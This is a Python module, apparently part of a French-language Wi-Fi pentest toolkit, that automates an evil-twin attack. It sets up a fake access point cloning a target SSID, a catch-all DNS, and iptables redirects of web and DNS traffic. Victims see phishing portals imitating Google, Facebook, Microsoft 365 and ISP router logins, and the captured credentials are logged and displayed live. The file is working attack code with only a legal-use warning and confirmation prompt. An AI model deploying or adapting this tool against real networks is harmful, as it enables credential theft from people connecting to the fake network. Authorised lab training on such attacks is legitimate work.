"""Evil Twin — Fake AP avec portail captif clonable (style fluxion/wifiphisher).

Orchestre :
  - hostapd (AP avec SSID identique à la cible)
  - dnsmasq (DHCP + DNS catch-all → tout pointe vers nous)
  - iptables (redirige 80/443 vers notre portail local)
  - python http.server (sert le portail HTML)
  - logger Python (capture les creds postés)
"""

import os
import time
import signal
import subprocess
import shutil
from core import ui, runner

ASSETS_DIR = os.path.join(os.path.dirname(__file__), "..", "assets")
PORTALS_DIR = os.path.join(ASSETS_DIR, "portals")
WORK_DIR = "/tmp/kt-eviltwin"


PORTAL_TEMPLATES = {
    "wifi_router":  ("Portail générique routeur",   "Page demande de re-saisie mdp WiFi (Bbox/Freebox/Livebox-style)"),
    "google":       ("Google login",                 "Clone de la page de connexion Google"),
    "facebook":     ("Facebook login",               "Clone de la page de connexion Facebook"),
    "microsoft":    ("Microsoft 365 login",          "Clone Office 365 / Outlook"),
}


def check_prereqs():
    needed = ["hostapd", "dnsmasq", "iptables", "python3"]
    missing = [t for t in needed if not runner.need_tool(t)]
    if missing:
        ui.err(f"manquants : {', '.join(missing)}")
        ui.info("sudo apt install hostapd dnsmasq iptables-persistent")
        return False
    return True


def select_portal():
    ui.header("Choix du portail captif")
    keys = list(PORTAL_TEMPLATES.keys())
    print()
    for i, k in enumerate(keys, 1):
        title, desc = PORTAL_TEMPLATES[k]
        print(f"  {ui.C}{i}{ui.RESET}. {ui.BOLD}{title}{ui.RESET}")
        print(f"     {ui.D}{desc}{ui.RESET}\n")
    try:
        n = int(ui.ask("portail", default="1"))
        return keys[n-1]
    except (ValueError, IndexError):
        return keys[0]


def setup_workdir(target_ssid, channel, mon_iface, portal_key):
    os.makedirs(WORK_DIR, exist_ok=True)
    work = {
        "hostapd_conf": os.path.join(WORK_DIR, "hostapd.conf"),
        "dnsmasq_conf": os.path.join(WORK_DIR, "dnsmasq.conf"),
        "creds_log":    os.path.join(WORK_DIR, "captured_creds.txt"),
        "portal_dir":   os.path.join(WORK_DIR, "portal"),
    }

    # hostapd config
    with open(work["hostapd_conf"], "w") as f:
        f.write(f"""interface={mon_iface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel={channel}
ieee80211n=1
auth_algs=1
wmm_enabled=0
""")

    # dnsmasq config (DHCP + DNS catch-all → 10.0.0.1)
    with open(work["dnsmasq_conf"], "w") as f:
        f.write(f"""interface={mon_iface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
""")

    # copie le portail
    if os.path.exists(work["portal_dir"]): shutil.rmtree(work["portal_dir"])
    src = os.path.join(PORTALS_DIR, portal_key)
    if not os.path.isdir(src):
        ui.err(f"template portail introuvable : {src}")
        return None
    shutil.copytree(src, work["portal_dir"])

    return work


def launch_attack(target_ssid, target_bssid, channel, mon_iface, portal_key):
    work = setup_workdir(target_ssid, channel, mon_iface, portal_key)
    if not work: return

    ui.header(f"EVIL TWIN actif — SSID '{target_ssid}' ch.{channel}")
    ui.info(f"Portail   : {portal_key}")
    ui.info(f"Workdir   : {WORK_DIR}")
    ui.info(f"Logs creds: {work['creds_log']}\n")

    procs = []
    iface = mon_iface

    try:
        # 0. Stop NetworkManager sur l'iface attaque
        runner.run(["airmon-ng", "check", "kill"], tag="et-kill", root=True, stream=False)

        # 1. Configure IP de l'iface en monitor → AP
        ui.info("[1/5] Configuration IP de l'interface AP…")
        # Pour hostapd il faut que l'iface ne soit PAS en monitor mais en managed
        # On la passe en managed temporairement
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=False)
        subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "managed"], check=False)
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface], check=False)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=False)
        subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface], check=False)

        # 2. iptables : forward + redirect
        ui.info("[2/5] iptables : redirect 80/443 vers nous…")
        rules = [
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", "tcp",
             "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"],
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", "tcp",
             "--dport", "443", "-j", "DNAT", "--to-destination", "10.0.0.1:80"],
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", "udp",
             "--dport", "53", "-j", "DNAT", "--to-destination", "10.0.0.1:53"],
            ["iptables", "-A", "FORWARD", "-i", iface, "-j", "ACCEPT"],
        ]
        for r in rules:
            subprocess.run(["sudo"] + r, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # 3. dnsmasq (DHCP + DNS catch-all)
        ui.info("[3/5] Lancement dnsmasq…")
        p_dns = subprocess.Popen(
            ["sudo", "dnsmasq", "--no-daemon", "-C", work["dnsmasq_conf"]],
            stdout=open(os.path.join(WORK_DIR, "dnsmasq.log"), "w"),
            stderr=subprocess.STDOUT
        )
        procs.append(("dnsmasq", p_dns))
        time.sleep(1)

        # 4. hostapd (le fake AP)
        ui.info(f"[4/5] Lancement hostapd → SSID '{target_ssid}' ch.{channel}…")
        p_hostapd = subprocess.Popen(
            ["sudo", "hostapd", work["hostapd_conf"]],
            stdout=open(os.path.join(WORK_DIR, "hostapd.log"), "w"),
            stderr=subprocess.STDOUT
        )
        procs.append(("hostapd", p_hostapd))
        time.sleep(2)

        if p_hostapd.poll() is not None:
            ui.err("hostapd s'est arrêté immédiatement — voir /tmp/kt-eviltwin/hostapd.log")
            raise RuntimeError("hostapd crashed")

        # 5. portail captif (python http.server avec handler custom)
        ui.info("[5/5] Lancement serveur portail…")
        server_script = os.path.join(os.path.dirname(__file__), "..", "scripts", "captive_server.py")
        p_web = subprocess.Popen(
            ["sudo", "python3", server_script, work["portal_dir"], work["creds_log"]],
            stdout=open(os.path.join(WORK_DIR, "webserver.log"), "w"),
            stderr=subprocess.STDOUT
        )
        procs.append(("web", p_web))
        time.sleep(1)

        # tout est lancé
        ui.ok("\n  ╔══════════════════════════════════════════╗")
        ui.ok(f"  ║  Evil Twin OPÉRATIONNEL — '{target_ssid}'  ")
        ui.ok("  ╚══════════════════════════════════════════╝")
        print(f"\n  {ui.G}▸{ui.RESET} hostapd  : OK (PID {p_hostapd.pid})")
        print(f"  {ui.G}▸{ui.RESET} dnsmasq  : OK (PID {p_dns.pid})")
        print(f"  {ui.G}▸{ui.RESET} portail  : OK (PID {p_web.pid})")
        print(f"\n  {ui.Y}▸{ui.RESET} Quand un client se connecte au SSID '{target_ssid}',")
        print(f"    il sera redirigé vers le portail captif")
        print(f"\n  {ui.M}▸{ui.RESET} Credentials capturés en live : tail -f {work['creds_log']}")
        print(f"\n  {ui.D}Ctrl-C pour arrêter et nettoyer{ui.RESET}\n")

        # tail des creds en live
        last_size = 0
        while True:
            time.sleep(2)
            if os.path.exists(work["creds_log"]):
                size = os.path.getsize(work["creds_log"])
                if size > last_size:
                    with open(work["creds_log"]) as f:
                        f.seek(last_size)
                        new = f.read()
                    print(f"{ui.R}{ui.BOLD}[!] CREDS CAPTURÉS :{ui.RESET}\n{new}")
                    last_size = size

    except (KeyboardInterrupt, RuntimeError):
        pass
    finally:
        ui.info("\n[cleanup] arrêt processus + restauration réseau…")
        for name, p in procs:
            try: subprocess.run(["sudo", "kill", str(p.pid)], stderr=subprocess.DEVNULL)
            except: pass
        # cleanup iptables
        subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "iptables", "-F"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)
        ui.ok("nettoyé.")
        if os.path.exists(work["creds_log"]) and os.path.getsize(work["creds_log"]) > 0:
            ui.ok(f"\nCreds finaux conservés dans : {work['creds_log']}")
        ui.pause()


def standalone():
    ui.banner()
    ui.header("EVIL TWIN — mode standalone")
    print(f"\n{ui.R}{ui.BOLD}⚠  USAGE LÉGAL UNIQUEMENT :{ui.RESET}")
    print(f"   - Ton propre lab (2 VMs, ta propre box)")
    print(f"   - Environnement de cours déclaré")
    print(f"   - JAMAIS sur réseau public ou tiers (délit Art. 323-1)\n")
    if not ui.confirm("Tu es dans un environnement autorisé ?"): return
    if not check_prereqs(): return

    iface = ui.ask("interface WiFi (ex: wlan0)")
    target_ssid = ui.ask("SSID à cloner (ex: Bbox-3F989A75)")
    target_bssid = ui.ask("BSSID cible (peu importe, juste pour log)", default="")
    channel = ui.ask("channel", default="6")
    if not (iface and target_ssid): return
    portal = select_portal()
    launch_attack(target_ssid, target_bssid, channel, iface, portal)


def launch_with_target(target_ssid, target_bssid, target_channel, mon_iface):
    """Appelé depuis wifi_wizard avec target déjà connue."""
    print(f"\n{ui.R}{ui.BOLD}⚠  Evil Twin sur '{target_ssid}' — usage légal autorisé ?{ui.RESET}")
    if not ui.confirm("Confirmer"): return
    if not check_prereqs(): return
    portal = select_portal()
    launch_attack(target_ssid, target_bssid, target_channel, mon_iface, portal)
